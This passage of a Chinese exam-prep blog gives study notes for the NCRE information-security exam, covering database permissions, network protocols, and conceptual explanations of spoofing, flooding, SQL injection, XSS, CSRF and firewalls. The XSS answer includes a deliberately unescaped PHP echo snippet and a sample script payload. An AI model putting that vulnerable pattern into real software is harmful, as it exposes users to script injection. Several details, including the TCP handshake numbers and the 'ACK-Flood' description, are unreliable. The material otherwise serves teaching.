<li>登录阶段，会话管理器启动的 winlogon.exe 进程将会启动本地安全性授权 lsass.exe 子系统，加载图形化标识和验证并等待用户登录，登录过程中，后天可能仍然在加载一些非关键的设备驱动</li>
</ul>
<h1 id="某公司的一个部门需要设置一个-Windows-操作系统的共享文件夹，需要全公司都能读取该文件夹中的文件，但是不能对文件夹的内容进行任何修改或向这个共享文件夹中添加新的文件或文件夹。只有本部门的成员才能具有对文件夹内容进行修改的访问权限。为-Everyone-Group-组设置该文件夹以实现这个目标的最好策略是什么？"><a href="#某公司的一个部门需要设置一个-Windows-操作系统的共享文件夹，需要全公司都能读取该文件夹中的文件，但是不能对文件夹的内容进行任何修改或向这个共享文件夹中添加新的文件或文件夹。只有本部门的成员才能具有对文件夹内容进行修改的访问权限。为-Everyone-Group-组设置该文件夹以实现这个目标的最好策略是什么？" class="headerlink" title="某公司的一个部门需要设置一个 Windows 操作系统的共享文件夹，需要全公司都能读取该文件夹中的文件，但是不能对文件夹的内容进行任何修改或向这个共享文件夹中添加新的文件或文件夹。只有本部门的成员才能具有对文件夹内容进行修改的访问权限。为 Everyone Group 组设置该文件夹以实现这个目标的最好策略是什么？"></a>某公司的一个部门需要设置一个 Windows 操作系统的共享文件夹，需要全公司都能读取该文件夹中的文件，但是不能对文件夹的内容进行任何修改或向这个共享文件夹中添加新的文件或文件夹。只有本部门的成员才能具有对文件夹内容进行修改的访问权限。为 Everyone Group 组设置该文件夹以实现这个目标的最好策略是什么？</h1><p>设置该目录设置用户组 Everyone Group 的目录权限和文件权限为Read（RX），共享权限安全级别为 Read</p>
<h1 id="什么是可信计算？其基本思想是什么？"><a href="#什么是可信计算？其基本思想是什么？" class="headerlink" title="什么是可信计算？其基本思想是什么？"></a>什么是可信计算？其基本思想是什么？</h1><p>可信的定义：一个实体是可信的，如果它的行为总以预期的方式，达到预期的目标。参与计算的组件，操作或过程在任意的条件下是可预测的，并能抵御病毒和物理干扰</p>
<p>可信指计算机系统所提供的服务是可以论证其是可信赖的。这就是指从用户角度看，计算机系统所提供的服务是可信赖的，而且这种可信赖是可论证的</p>
<p>可信 ≈ 安全 + 可靠</p>
<p>可信计算机系统是能够提供系统的可靠性、可用性、信息和行为安全性的计算机系统</p>
<h1 id="简述可信计算组织的可信平台模块与中国可信密码模块的结构及优缺点"><a href="#简述可信计算组织的可信平台模块与中国可信密码模块的结构及优缺点" class="headerlink" title="简述可信计算组织的可信平台模块与中国可信密码模块的结构及优缺点"></a>简述可信计算组织的可信平台模块与中国可信密码模块的结构及优缺点</h1><p>总体上是很成功的，以硬件芯片增强计算平台安全的基本思想，为可信计算平台提供了信任根。可信平台模块以密码技术支持了可信计算组织的可信度量、存储、报告功能，为用户提供确保平台系统资源完整性、数据安全存储和平台远程证明</p>
<p>存在一些不足，采用LPC总线与系统连接，不适合大数据量通信；缺少芯片本身物理安全方面的设计；可信测量根是一个软件模块，存储在可信平台模块之外，容易遭受恶意攻击；在密码配置方面存在一些不足，如密钥种类多、授权协议复杂、可信平台模块内部缺少对称密码等；可信平台模块的设计主要面向PC平台的，对于服务器和嵌入式移动运算平台并不完全适合。</p>
<p>可信密码模块与可信平台模块相比，在设计上充分考虑了可信平台模块存在的不足，在芯片本身物理安全和密码配置方面等都有明显提升，可信密码模块包括密码计算区、受保护存储区和主计算区，提供多种密码算法，特别适用了自主密码算法SM2、SM3、SMS4、RNG，其目标是建立计算平台安全信任基。</p>
<h1 id="什么是数据库的安全性？实现数据库安全性控制的常用方法和技术有哪些？"><a href="#什么是数据库的安全性？实现数据库安全性控制的常用方法和技术有哪些？" class="headerlink" title="什么是数据库的安全性？实现数据库安全性控制的常用方法和技术有哪些？"></a>什么是数据库的安全性？实现数据库安全性控制的常用方法和技术有哪些？</h1><p>数据库安全性指保护数据库，防止因用户非法使用数据库造成数据泄露、更改或破坏。数据库系统的安全保护措施是否有效是数据库系统主要的性能指标之一</p>
<p>数据库安全性控制的常用方法包括用户标识和鉴别、存取控制、审计、数据加密等</p>
<p>数据库提供两种存取控制机制：自主存取机制和强制存取机制。</p>
<p>数据库 <code>SCHEMA</code> 、基本表 <code>TABLE</code> 、视图 <code>VIEW</code> 、索引 <code>INDEX</code></p>
<p>自主存取控制通过 <code>GRANT</code> 语句授权和 <code>REVOKE</code> 语句收回授予的其权限来实现</p>
<ul>
<li><p>GRANT 语句格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GRANT &lt;权限&gt; [,&lt;权限&gt;] ···</span><br><span class="line"></span><br><span class="line">ON &lt;对象类型&gt; &lt;对象名&gt; [,&lt;对象类型&gt; &lt;对象名&gt;] ···</span><br><span class="line"></span><br><span class="line">TO &lt;用户&gt; [,&lt;用户&gt;] ···</span><br><span class="line"></span><br><span class="line">[WITH GRANT OPTION];</span><br></pre></td></tr></table></figure>
<p>全体用户: <code>PUBLIC</code></p>
<p>指定 <code>WITH GRANT OPTION</code> 语句，则获取某种权限的用户可将这种权限再授予其他用户，未指定则不能传播该权限</p>
</li>
<li><p>REVOKE 语句格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REVOKE &lt;权限&gt; [,&lt;权限&gt;] ···</span><br><span class="line">  ON &lt;对象类型&gt; &lt;对象名&gt; [,&lt;对象类型&gt; &lt;对象名&gt;] ···</span><br><span class="line">  FROM &lt;用户&gt; [,&lt;用户&gt;] ···</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>GRANT 和 REVOKE 语句向用户授予或回收对 <strong>数据</strong> 的操作权限，对 <strong>数据库模式</strong> 的授权则由 DBA 来创建用户时实现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE USER &lt;用户名&gt;</span><br><span class="line">[WITH] [DBA|RESOURCE|CONNECT];</span><br></pre></td></tr></table></figure>
<p>新创建的用户有3种权限：</p>
<ul>
<li>DBA : 超级用户，可创建新用户、模式、基本表和视图等，对所有数据库对象都有存取权限还可将这些权限授予一般用户</li>
<li>RESOURCE : 能创建基本表和视图，不能创建模式和新用户</li>
<li>CONNECT : 不能创建新用户、模式和基本表，只能登录数据库</li>
</ul>
<h1 id="什么是数据库角色？如何利用数据库角色对用户授权？"><a href="#什么是数据库角色？如何利用数据库角色对用户授权？" class="headerlink" title="什么是数据库角色？如何利用数据库角色对用户授权？"></a>什么是数据库角色？如何利用数据库角色对用户授权？</h1><p>数据库角色是被命名的一组与数据库操作相关的权限，角色是授权的集合。可以为一组具有相同权限的用户创建一个角色，使用角色来管理数据库权限可以简化授权的过程</p>
<p>使用 <code>CREATE ROLE</code> 语句创建角色：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE ROLE &lt;角色名&gt;</span><br></pre></td></tr></table></figure>
<p>将创建的角色授予其他角色或用户：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CRANT &lt;角色1&gt; [,&lt;角色2&gt;] ··· </span><br><span class="line">TO &lt;角色a&gt; [,&lt;用户&gt;] ···</span><br><span class="line">[WITH ADMIN OPTION];</span><br></pre></td></tr></table></figure>
<p>指定 <code>WITH ADMIN OPTION</code> 则获得某权限的角色或用户还可将该权限授予其他角色</p>
<h1 id="什么是数据库审计？如何设置和取消审计功能"><a href="#什么是数据库审计？如何设置和取消审计功能" class="headerlink" title="什么是数据库审计？如何设置和取消审计功能"></a>什么是数据库审计？如何设置和取消审计功能</h1><p>把用户对数据库的所有操作自动记录下来放入审计日志中，数据库管理员可利用审计跟踪的信息，重现导致数据库现有状况的一系列事件，找出非法存取数据的人、时间和内容等</p>
<p>使用 <code>AUDIT</code> 语句设置审计功能，<code>NOAUDIT</code> 取消审计功能</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 对修改 SC 表结构和表数据的操作进行审计</span><br><span class="line">AUDIT ALTER, UPDATE</span><br><span class="line">ON SC;</span><br><span class="line"># 取消对 SC 表的一切审计</span><br><span class="line">NOAUDIT ALTER,UPDATE</span><br><span class="line">ON SC;</span><br></pre></td></tr></table></figure>
<h1 id="视图机制有哪些优点？"><a href="#视图机制有哪些优点？" class="headerlink" title="视图机制有哪些优点？"></a>视图机制有哪些优点？</h1><p>可以限制用户的访问范围，通过视图机制把要保密的数据对无权存取这些数据的用户隐藏起来，从而自动地对数据提供一定程度的安全保护</p>
<h1 id="数据库完整性约束条件可以分为哪几类？"><a href="#数据库完整性约束条件可以分为哪几类？" class="headerlink" title="数据库完整性约束条件可以分为哪几类？"></a>数据库完整性约束条件可以分为哪几类？</h1><p>数据库完整性：语义完整性、参照完整性、实体完整性</p>
<p>约束：</p>
<ul>
<li><code>PRIMARY KEY</code> 约束标识列或列集，这些列或列集的值唯一标识表中的行</li>
<li><code>FOREIGN KEY</code> 约束标识表之间的关系，用于强制参照完整性，为表中一列或者多列数据提供参照完整性</li>
<li><code>UNIQUE</code> 约束在列集内强制执行值的唯一性。对于 UNIQUE 约束中的列，表中不允许有两行包含相同的非空值。主键强制执行唯一性，但主键不允许空值。而且每个表中主键只能有一个，但 <code>UNIQUE</code> 列却可以有多个，<code>UNIQUE</code> 约束优先于唯一的索引</li>
<li><code>CHECK</code> 通过限制用户输入的值来加强域完整性。它指定应用于列中输入的所有值的布尔搜索条件，拒绝所有不取值为<code>TRUE</code> 的值，可为没列指定多个 <code>CHECK</code> 约束</li>
<li><code>NOT NULL</code> 指定字段是否允许为空</li>
</ul>
<h1 id="设有如下两种关系模式"><a href="#设有如下两种关系模式" class="headerlink" title="设有如下两种关系模式"></a>设有如下两种关系模式</h1><p>职工(职工号,名称,年龄,职务,工资,部门号)，其中职工号为主键<br>部门(部门号,名称,经理名,电话)，其中部门号为主键<br>试用 SQL 的 CRANT 和 REVOKE 语句加上视图机制，完成以下授权定义或存取控制功能</p>
<ul>
<li>用户王明对两个表有 SELECT 权力</li>
<li>用户李勇对两个表有 INSERT 和 DELETE 权力</li>
<li>用户刘星对职工表有 SELECT 权力，对工资字段具有更新权力</li>
<li>用户张新具有修改两个表的结构的权力</li>
<li>用户王明对两个表有的所以权力（读、写、修改、删除数据），并具有给其他用户授权的权力</li>
<li>用户杨兰具有查找每个部门职工中的最高工资、最低工资、平均工资的权力，但她不能查看每个人都工资</li>
</ul>
<h1 id="描述数据库安全防护的3个阶段"><a href="#描述数据库安全防护的3个阶段" class="headerlink" title="描述数据库安全防护的3个阶段"></a>描述数据库安全防护的3个阶段</h1><ul>
<li>事前检查：指采购及部署数据库阶段，对运行环境以及数据库本身安全特性进行检查，包括硬件环境与操作系统及数据库服务器的运行环境的安全检测、数据库漏洞检测两部分</li>
<li>事中监控：对数据库运行期间客户端与数据库交互行为的监控，包括身份认证、访问控制以及交互数据的检测等</li>
<li>事后审计：是指对日志文件的审计，用于分析、跟踪发现问题</li>
</ul>
<h1 id="试述数据库安全检测的3个层次及其内容"><a href="#试述数据库安全检测的3个层次及其内容" class="headerlink" title="试述数据库安全检测的3个层次及其内容"></a>试述数据库安全检测的3个层次及其内容</h1><ul>
<li>端口扫描：也称服务器发现，主要是对数据库的开放端口进行扫描，检查其中的安全缺陷，如开放了多余的服务器端口</li>
<li>渗透测试：渗透测试是对数据库服务器进行黑河式的安全检测，检测前不知道数据库内部的任何信息，完全根据对数据库外围的信息收集，来对数据库的安全进行测试，找到其中的安全隐患。渗透测试的对象主要是数据库的身份验证系统和服务监听系统</li>
<li>内部安全监测：深入数据库内，对数据库内部安全的相关对象进行完整的扫描和检测，包括安全元数据、内部审计、安全配置检查、漏洞检测和版本补丁检测等</li>
</ul>
<h1 id="说明事务处理中可以回退和不可以回退的语句各有哪些？"><a href="#说明事务处理中可以回退和不可以回退的语句各有哪些？" class="headerlink" title="说明事务处理中可以回退和不可以回退的语句各有哪些？"></a>说明事务处理中可以回退和不可以回退的语句各有哪些？</h1><ul>
<li>可回退：<code>INSERT</code> ,<code>UPDATE</code> , <code>DELETE</code></li>
<li>不可回退： <code>SELECT</code> , <code>CREATE</code> , <code>DROP</code></li>
</ul>
<h1 id="试述数据库中的访问控制机制"><a href="#试述数据库中的访问控制机制" class="headerlink" title="试述数据库中的访问控制机制"></a>试述数据库中的访问控制机制</h1><p>数据库不允许未经授权的用户对数据库进行操。用户标识和鉴别是系统提供的最外层的安全措施。由系统提供一定的方法让用户标识自己的名字或身份，系统内部记录着所有合法用户的标识。每次用户要求进入系统时，由系统进行核实，通过鉴定后才能提供机器的使用权。</p>
<h1 id="一些命令"><a href="#一些命令" class="headerlink" title="一些命令"></a>一些命令</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 创建基本表</span><br><span class="line">CREATE TABLE 表名(</span><br><span class="line">字段名1 类型(宽度,小数),</span><br><span class="line">字段名1 类型(宽度,小数),</span><br><span class="line">···</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"># 修改、删除基本表</span><br><span class="line">ALTER TABLE &lt;表名&gt; &lt;指令&gt;(</span><br><span class="line">&lt;字段名1 类型(宽度,小数)&gt;,</span><br><span class="line">&lt;字段名1 类型(宽度,小数)&gt;,</span><br><span class="line">···</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">DROP TABLE &lt;表名&gt;;</span><br><span class="line"></span><br><span class="line"># 插入数据</span><br><span class="line">INSERT INTO &lt;表名&gt; [(&lt;字段名&gt;,&lt;字段名&gt;,···)];</span><br><span class="line">VALUES (&lt;表达式1&gt;,&lt;表达式2&gt;,···);</span><br><span class="line"></span><br><span class="line"># SELECT 查询</span><br><span class="line">SELECT &lt;表达式1&gt;,&lt;表达式2&gt;,··· &#x2F;&#x2F;查询目标</span><br><span class="line">FROM &lt;关系1&gt;,&lt;关系2&gt;,···  &#x2F;&#x2F;查询的源(所有关系的关系名)</span><br><span class="line">[WHERE &lt;条件&gt;]; &#x2F;&#x2F;查询目标必须满足的条件</span><br><span class="line"></span><br><span class="line"># 更新数据</span><br><span class="line">UPDATE &lt;表名&gt;</span><br><span class="line">SET &lt;更新表达式&gt;</span><br><span class="line">[WHERE &lt;条件&gt;];</span><br><span class="line"></span><br><span class="line"># 删除数据</span><br><span class="line">DELETE</span><br><span class="line">FROM &lt;表名&gt;</span><br><span class="line">WHERE &lt;条件&gt;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>NCRE</category>
      </categories>
      <tags>
        <tag>NCRE</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机等级考试三级信息安全技术章节习题4</title>
    <url>/posts/46a3d690/</url>
    <content><![CDATA[<p><strong>四、网络安全</strong></p>
<h1 id="简述-TCP-IP-协议架构的层次架构和各层包含的主要协议"><a href="#简述-TCP-IP-协议架构的层次架构和各层包含的主要协议" class="headerlink" title="简述 TCP/IP 协议架构的层次架构和各层包含的主要协议"></a>简述 TCP/IP 协议架构的层次架构和各层包含的主要协议</h1><ul>
<li>物理和数据链路层</li>
<li>网络层：TCP/IP 体系结构最重要的一层，IP 协议族是网路层的基础协议包括用于路由选择的 <code>RIP</code> 、 <code>OSPF</code> 等路由协议，用于数据传输的 IP 协议，用于网络管理的 SNMP 协议,用于故障诊断的 ICMP 协议。</li>
<li>传输层：TCP 协议提供端到端可靠数据传输，UDP 协议提供端到端不可靠传输。</li>
<li>应用层：文件传输协议 FTP ，超文本传输协议 HTTP ，简单邮件传输协议 SMTP/POP3 ，域名系统 DNS ，远程终端登录协议 Telnet ，简单网络管理 SNMP 等。</li>
</ul>
<a id="more"></a>
<h1 id="简述-ARP-协议欺骗的原理"><a href="#简述-ARP-协议欺骗的原理" class="headerlink" title="简述 ARP 协议欺骗的原理"></a>简述 ARP 协议欺骗的原理</h1><p>ARP 协议主要完成从 IP 地址到 MAC 地址的转换，主机中的 ARP 缓存表都有更新机制，每台主机在收到 ARP 数据包时就会更新自己的 ARP 缓存表。ARP 欺骗的原理就是恶意主机伪装并发送欺骗性的 ARP 数据包，致使其他主机收到欺骗性的 ARP 数据包后，更新其 ARP 缓存表，从而建立错误的 IP 地址与 MAC 地址的对应关系。</p>
<h1 id="简述-ICMP-协议的功能"><a href="#简述-ICMP-协议的功能" class="headerlink" title="简述 ICMP 协议的功能"></a>简述 ICMP 协议的功能</h1><p>Internet 控制报文协议（Internet Control Message Protocol , ICMP）主要的作用是在 TCP/IP 网路中发送出错和控制消息，允许主机或网络设备报告差错或异常情况，从而提供一个错误侦测与反馈机制</p>
<p>主要功能是差错报告和查询</p>
<h1 id="简述-TCP-协议的三次握手过程"><a href="#简述-TCP-协议的三次握手过程" class="headerlink" title="简述 TCP 协议的三次握手过程"></a>简述 TCP 协议的三次握手过程</h1><ul>
<li>A 主机向 B 主机发送 <code>SYN=1</code> 的数据包，希望建立同步连接，数据包序号 <code>SEQ=X</code> ，A 进入 <code>SYN_SENT</code> 状态</li>
<li>B 收到数据包，同意建立连接，返回数据包 <code>SYN=1 , ACK=1</code> ，数据包序号 <code>SEQ=Y</code> ，确认号 <code>X+1</code>  ，B 进入 <code>SYN_RECV</code> 状态 </li>
<li>A 收到返回的数据包，确认建立连接，发送数据包 <code>ACK=1</code> ，数据包序号 <code>SEQ=Y+1</code> ，确认号 <code>Y+1</code> ，A 、B 进入 <code>ESTABLISHED</code> 状态，TCP 连接成功</li>
</ul>
<p>请求包 <code>SYN</code></p>
<p>应答包 <code>ACK</code></p>
<h1 id="说明-TCP-全连接扫描、TCP-SYN-扫描和-TCP-FIN-扫描的原理和不同之处"><a href="#说明-TCP-全连接扫描、TCP-SYN-扫描和-TCP-FIN-扫描的原理和不同之处" class="headerlink" title="说明 TCP 全连接扫描、TCP SYN 扫描和 TCP FIN 扫描的原理和不同之处"></a>说明 TCP 全连接扫描、TCP SYN 扫描和 TCP FIN 扫描的原理和不同之处</h1><ul>
<li>TCP 全连接扫描：利用 TCP 协议三次握手原理来探测目标主机的网络端口是否处于打开状态。都尝试与目标主机建立正常的 TCP 三次握手的全连接。如果能建立起三次握手，则说明三次握手所连接的目标主机的端口是打开的，所有扫描过程容易被检测出来。</li>
<li>TCP SYN 扫描：半连接扫描，利用前两次握手，降低了被发现的可能，同时提高了扫描性能。</li>
<li>TCP FIN 扫描：发送 FIN 标识位为 1 的数据包给目标主机，若目标主机端口是开放的，则丢弃此包，不进行回应，若未开放，则返回一个 RST 标识位为 1 的数据包。由于不采用 TCP 三次握手连接方法，扫描行为更加隐秘，也称秘密扫描。这种方法适用于 UNIX 操作系统主机，有些操作系统（Windows NT）不论端口是否打开都回复 RST 这种方法就不适用了。</li>
</ul>
<h1 id="简述网络漏洞扫描和主机漏洞扫描的区别"><a href="#简述网络漏洞扫描和主机漏洞扫描的区别" class="headerlink" title="简述网络漏洞扫描和主机漏洞扫描的区别"></a>简述网络漏洞扫描和主机漏洞扫描的区别</h1><ul>
<li>网络漏洞扫描：网络漏洞扫描工具针对网络中的主机和网络设备，发送漏洞探测数据包进行漏洞的扫描，模拟攻击技术扫描出具体的漏洞类型，扫描工具中的漏洞脚本库中包含大量漏洞的模型攻击脚本或代码。网络漏洞扫描工具无法通过网络扫描没有网络服务功能的应用软件的漏洞</li>
<li>主机漏洞扫描，主机漏洞扫描工具通过检测本机安装的操作系统和应用软件系统版本信息和补丁安装情况根据自身数据库中保留的最新补丁信息进行比较，判断是否存在某些为打补丁的漏洞</li>
</ul>
<h1 id="介绍基于-DNS服务器的欺骗技术原理"><a href="#介绍基于-DNS服务器的欺骗技术原理" class="headerlink" title="介绍基于 DNS服务器的欺骗技术原理"></a>介绍基于 DNS服务器的欺骗技术原理</h1><p>欺骗目标是 DNS 服务器。攻击者首先向 DNS 服务器发送域名对应 IP 地址的查询请求， DNS 服务器在没有此域名的条件下会向更高级别的 DNS 服务器上传查询请求。此时，攻击者可以 <strong>伪造更高级别 DNS 服务器返回的 DNS 应答包</strong> ，告知此 DNS 服务器要查询域名的 IP 地址，这个 IP 地址往往被设置为攻击者自己服务器的 IP 地址。被欺骗的 DNS 服务器收到 DNS 应答数据包后，将域名和对应的虚假 IP 地址记录到自身缓存中，当网络中有查询此域名时，就从缓存中找到虚假 IP 地址返回给用户，使用户访问的虚假 IP 地址对应的攻击者的服务器</p>
<h1 id="说明网站挂马的概念及原理"><a href="#说明网站挂马的概念及原理" class="headerlink" title="说明网站挂马的概念及原理"></a>说明网站挂马的概念及原理</h1><p>网站中的网页被攻击者恶意修改后，添加了可以触发并下载恶意程序链接以及恶意程序代码和脚本</p>
<p>挂马的前提是入侵网站服务器，具有网站中网页的修改权限，攻击者对网站中的网页进行修改，通过 iframe 内嵌框架、跨站脚本链接等内嵌链接机制，将恶意链接添加到网页中。恶意网页是被攻击者篡改或恶意构建的其他网站的网页，在恶意网页中往往被攻击者挂载了含有漏洞利用代码的文件或脚本，文件和脚本在用户访问恶意网页时会自动下载并执行，用户计算机中浏览器及插件漏洞会被利用并导致文件和脚本中指向或包括的木马病毒自动被下载和运行</p>
<h1 id="说明-Dos-攻击的3种实现方式"><a href="#说明-Dos-攻击的3种实现方式" class="headerlink" title="说明 Dos 攻击的3种实现方式"></a>说明 Dos 攻击的3种实现方式</h1><ul>
<li>利用目标主机自身存在的拒绝服务型漏洞进行攻击</li>
<li>耗尽目标主机 CPU 和内存等计算机资源的攻击</li>
<li>耗尽目标主机网络带宽攻击</li>
</ul>
<h1 id="介绍-SYN-Flood-攻击的原理"><a href="#介绍-SYN-Flood-攻击的原理" class="headerlink" title="介绍 SYN-Flood 攻击的原理"></a>介绍 SYN-Flood 攻击的原理</h1><p>攻击者向目标主机发送第一次 SYN 握手请求数据包，伪造了此数据包的源 IP 地址为不存在或网络不可达的一个 IP 地址，地址不存在或网络不可达，所以没用第三次握手的响应数据包，主机就要等一段时间后才丢弃未完成的连接，这会占用一定的 CPU 和内存资源，攻击者通过大量伪造的 SYN 数据包，形成大量的半开连接，直至资源耗尽</p>
<h1 id="介绍-ACK-Flood-攻击的原理"><a href="#介绍-ACK-Flood-攻击的原理" class="headerlink" title="介绍 ACK-Flood 攻击的原理"></a>介绍 ACK-Flood 攻击的原理</h1><p>利用握手过程，在发送 SYN 数据包给目标主机之前，将该数据包的源地址和目标地址都设置成目标主机的 IP 地址。这会导致目标主机向自己的 IP 地址响应 SYN+ACK 数据包，结果又向自己发送 ACK 消息并创建一个空连接，每个空连接都会保留至超时，当这样的连接数量很多时，系统资源将会被耗尽</p>
<h1 id="介绍应用层脚本洪水攻击的原理"><a href="#介绍应用层脚本洪水攻击的原理" class="headerlink" title="介绍应用层脚本洪水攻击的原理"></a>介绍应用层脚本洪水攻击的原理</h1><p>应用层 DoS 攻击是脚本洪水攻击，攻击者利用代理服务器对 Web 服务器发送大量的 HTTP Get 请求，如果目标服务器的动态 Web 服务器，大量的 HTTP Get 请求主要是查询动态网页，这些请求会给后台的数据库服务器制造极大负载直至无法正常响应，从而使正常用户的访问也无法进行了</p>
<p>针对动态脚本页面的网站服务器，脚本洪水攻击的效果很明显，由于这些网站大量前端脚本程序会调用后台数据库。而针对静态页面的网站服务器，由于不会调用后台数据库中的数据，攻击效果就不明显。由于脚本洪水攻击需要和网站服务器建立正常的 TCP 连接，因而会暴露攻击者的 IP 地址</p>
<h1 id="举例说明-SQL-注入的原理"><a href="#举例说明-SQL-注入的原理" class="headerlink" title="举例说明 SQL 注入的原理"></a>举例说明 SQL 注入的原理</h1><p>Web应用程序在接收到用户的请求参数后，如果咩有对请求参数进行严格的过滤或检查，而直接将用户的请求参数作为拼接 SQL 语句的一部分进行解释执行，则攻击者就可以通过构造一段 SQL 代码片段作为请求参数提交给 Web 应用程序，从而使这段 SQL 代码得到后台数据库程序的解释执行，使攻击者能查询操作后台数据库</p>
<h1 id="举例说明跨站脚本攻击的原理"><a href="#举例说明跨站脚本攻击的原理" class="headerlink" title="举例说明跨站脚本攻击的原理"></a>举例说明跨站脚本攻击的原理</h1><p>利用网站程序对 Web 页面中输入的数据过滤不严格或未做过滤的漏洞，攻击者往 Web 页面中恶意脚本代码，当用户浏览页面时，使用户的浏览器会自动加载并执行页面中插入的恶意脚本代码，从而实现在用户浏览器中显示攻击者的恶意脚本、控制用户浏览器或窃取用户资料的目的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line">    <span class="variable">$user</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span> .<span class="variable">$user</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果用户提交请求 <code>xxx.com/xss.php?user=&lt;scropt&gt;alert(/xss/)&lt;/scropt&gt;</code> 代码将被返回给客户端比嗯执行后显示在浏览器中</p>
<ul>
<li>反射型 XSS ：非持久型跨站脚本攻击，向用户发送带有恶意攻击脚本的一个 URL 连接</li>
<li>存储型 XSS ：持久型跨站脚本攻击， XSS 保存在服务器端（如攻击者将恶意数据嵌入到博客或BBS 社区的帖子内容中，用户查看对应的博客或帖子时，其中的攻击脚本将被执行）</li>
<li>DOM-based XSS ：基于文档对象模型的跨站脚本攻击，通过 JavaScript 脚本动态修改 DOM 结构，进而导致XSS 漏洞</li>
</ul>
<h1 id="解释说明跨站请求伪造攻击的概念及原理"><a href="#解释说明跨站请求伪造攻击的概念及原理" class="headerlink" title="解释说明跨站请求伪造攻击的概念及原理"></a>解释说明跨站请求伪造攻击的概念及原理</h1><p>跨站请求伪造攻击（Cross Site Request Forgery，CSRF）属于伪造客户端请求，让用户访问攻击者构造的网页，执行网页中的恶意脚本，伪造用户的请求，对用户有登录权限的网站空间实施攻击。通过攻击者的站点对用户可登录的站点发起的攻击，而且攻击脚本利用的是伪造的用户请求，因此被称为跨站点请求伪造攻击。</p>
<p>当用户通过用户名和口令完成对目标 Web 应用服务器的登录验证后，用户的浏览器会存储登录验证后由 Web 应用服务器返回给浏览器的会话认证信息，即 Cookie 数据。用户针对该 Web 应用服务器的 HTTP 请求，用户的浏览器都会自动通过保存的 Cookie 通过验证，而不用输入用户名和口令。</p>
<p>攻击者可以在自己控制网站的页面中编写对用户的 Web 应用空间发起的伪造 HTTP 表单的恶意代码，然后诱骗用户浏览攻击者构造的页面，执行页面中嵌入的恶意代码。恶意代码在受害用户不知道的情况下，通过保存在用户浏览器中的 Cookie 通过用户 Web 应用空间的验证后，以用户的身份执行 HTTP 表单请求操作，泄漏 Web 应用中用户的敏感数据或是篡改 Web 应用中的相关数据。</p>
<h1 id="解释说明木马的端口反弹技术"><a href="#解释说明木马的端口反弹技术" class="headerlink" title="解释说明木马的端口反弹技术"></a>解释说明木马的端口反弹技术</h1><p>木马的服务端程序从内网主动发起对外连接请求，连接到外网木马的客户端。反弹式木马是服务端主动发起连接请求，而客户端是被动的等待连接，木马服务端通过设置固定的客户端 IP 地址和连接端口，直接回连木马的客户端程序。还有动态 IP 地址的木马客户端，利用一台被控制的代理服务器保存每次改变后的客户端的 IP 地址和待连接的端口，木马服务端每次启动时，先连接代理服务器获取客户端的动态 IP 地址和端口信息</p>
<h1 id="说明防火墙的-NAT-原理"><a href="#说明防火墙的-NAT-原理" class="headerlink" title="说明防火墙的 NAT 原理"></a>说明防火墙的 NAT 原理</h1><p>网络地址翻译技术（Network Address Translation , NAT）能将单位内网只用的内部 IP 地址翻译为合法的公网 IP 地址，这使内网使用内部 IP 地址的计算机无线变动也能与外网连接。</p>
<p>NAT 将内部 IP 地址翻译为公网 IP 地址。当外部公网响应的数据包返回给 NAT 后，NAT 再将其翻译为内网 IP 地址发给内网的主机，从而实现内网主机与外网的正常通信，解决了 IPv4 地址不足的问题。同时因为外网主机只能看到数据包来自 NAT 翻译后的公网 IP 地址，而看不到内网主机的内部 IP 地址，所以 NAT 可保护及隐藏内网计算机。</p>
<h1 id="说明防火墙的包过滤技术和动态检测技术的区别"><a href="#说明防火墙的包过滤技术和动态检测技术的区别" class="headerlink" title="说明防火墙的包过滤技术和动态检测技术的区别"></a>说明防火墙的包过滤技术和动态检测技术的区别</h1><p>内外网之间传输的数据包按照某些特征事先设置一系列的安全规则（或安全策略）进行过滤或筛选。包过滤防火墙检查每一条规则。如果发现数据包中的信息与某规则相符，则允许或拒绝这个数据包穿过防火墙进行传输。如果没有规则能符合，则防火墙会使用默认规则。一般情况默认规则就是要求防火墙丢弃该包</p>
<p>状态检测技术也称动态包过滤技术，不像包过滤防火墙仅靠设置静态的包过滤规则来镜像数据包的过滤拦截，而是增加对数据包连接状态变化的额外考虑。防火墙的核心部分建立数据的连接状态表，对在内外网间传输的数据包以会话角度进行检测，利用状态表跟踪每一个会话状态，记录有用的信息以帮助识别不同的会话</p>
<p>和包过滤防火墙相比，状态检测防火墙动态记录连接的各种状态，可以在连接终止后及时阻断后续连接，防止伪造流量通过；可有效阻止更多伪造网络地址的 DoS 攻击，而且不用为了大量的正常访问请求而长久地开放大量端口。</p>
<h1 id="说明入侵检测系统和入侵防御系统功能的区别"><a href="#说明入侵检测系统和入侵防御系统功能的区别" class="headerlink" title="说明入侵检测系统和入侵防御系统功能的区别"></a>说明入侵检测系统和入侵防御系统功能的区别</h1><p>入侵检测系统（Intrusion Detection System , IDS）工作在计算机网络系统中的关键节点上，通过实时收集和分析计算机网络或系统中的信息来检查是否出现违反安全策略的行为和是否存在入侵的迹象，进而达到提示入侵、预防攻击的目的。是对防火墙有益的补充，它对网络和主机行为进行检测，提供内部攻击、外部攻击和误操作的实施监控，增强了网络的安全性。入侵检测系统可以实现事前警告、事中防护和事后取证。</p>
<p>入侵防御系统（Intrusion Prevention System , IPS）作为一种在线部署的产品，能够提供主动的、实时的防护，其设计目标在与准确监测网络流量，自动分析对各类网络攻击行为，并对应用层的威胁和攻击进行实时阻断，而入侵检测系统只是在监测到恶意流量的同时或之后才简单地告警。</p>
